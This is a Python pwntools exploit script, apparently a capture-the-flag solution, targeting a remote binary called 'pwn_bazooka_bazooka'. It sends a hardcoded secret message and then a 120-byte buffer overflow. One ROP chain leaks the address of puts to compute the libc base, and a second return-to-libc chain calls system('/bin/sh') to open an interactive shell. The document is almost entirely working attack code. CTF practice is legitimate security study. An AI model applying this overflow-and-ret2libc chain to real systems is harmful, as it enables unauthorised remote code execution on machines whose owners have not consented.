from pwn import *

context.log_level = 'debug'

host = '34.89.211.188'
port = 30027

local_bin = "pwn_bazooka_bazooka"
elf = ELF(local_bin)
rop = ROP(elf)

LOCAL = False
if LOCAL:
  conn = process(elf.path)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
  conn = remote(host, port)
  # libc = ELF("./lib/libc.so.6")
  # libc = ELF("./data/lib/x86_64-linux-gnu/libc.so.6")
  libc = ELF("./libc6_2.27-3ubuntu1.3_amd64.so")
  assert(libc.symbols["puts"] - libc.symbols["printf"] == 113456)

OFFSET = 'A' * 120
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
PUTS_PLT = elf.plt['puts']
PRINTF_PLT = elf.plt['printf']
MAIN_PLT = elf.symbols['main']


def get_addr(func_name):
  FUNC_GOT = elf.got[func_name]
  log.info(func_name + " GOT @ " + hex(FUNC_GOT))
  # Create rop chain
  rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
  with open('commands', 'a') as f:
    f.write(rop1 + '\n')

  #Send our rop-chain payload
  #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
  print(conn.clean()) # clean socket buffer (read all and print)
  conn.sendline(rop1)
  # conn.interactive()

  #Parse leaked address
  # conn.recvline()
  recieved = conn.recvuntil('---')
  print(recieved.encode("hex"))
  leak = (recieved[16:16+6])
  print(leak.encode('hex'))
  leak = u64(leak.ljust(8, "\x00"))
  # print(recieved.ljust(8, "\x00"))
  log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
  #If not libc yet, stop here
  if libc != "":
    func_offset = libc.symbols[func_name]
    # func_offset = 0x80a30
    libc.address = leak - func_offset  #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
  
  return hex(leak)


def openRealBazookaStations():
  response = conn.recvuntil('message: ')
  print(response)
  secret_message = '#!@{try_hard3r}'
  with open('commands', 'a') as f:
    f.write(secret_message + '\n')
  conn.sendline(secret_message)

  response = conn.recvuntil('Message: ')
  print(response)

openRealBazookaStations()
get_addr("puts")
# openRealBazookaStations()
# get_addr("printf")

# print("FUCK IT")


PATH = next(libc.search("PATH"))
LS = next(libc.search("ls"))
BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
ABORT = libc.sym["abort"]
PUTS = libc.sym["puts"]
GETENV = libc.sym["getenv"]
LOOP = elf.sym["l00p"]
# BINSH = libc.address + 0x1b40fa
# SYSTEM = libc.address + 0x4f4e0
# EXIT = libc.address + 0x431d0

openRealBazookaStations()
# payload = OFFSET + p64(POP_RDI) + p64(PATH) + p64(GETENV) + p64(PUTS_PLT) + p64(EXIT)
payload = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(POP_RDI+1) + p64(SYSTEM) + p64(EXIT)
with open('commands', 'a') as f:
  f.write(payload + '\n')

# with open('commands', 'w') as file:
#   file.writelines([secret_message + '\n', payload + '\n'])

conn.sendline(payload)

conn.interactive()

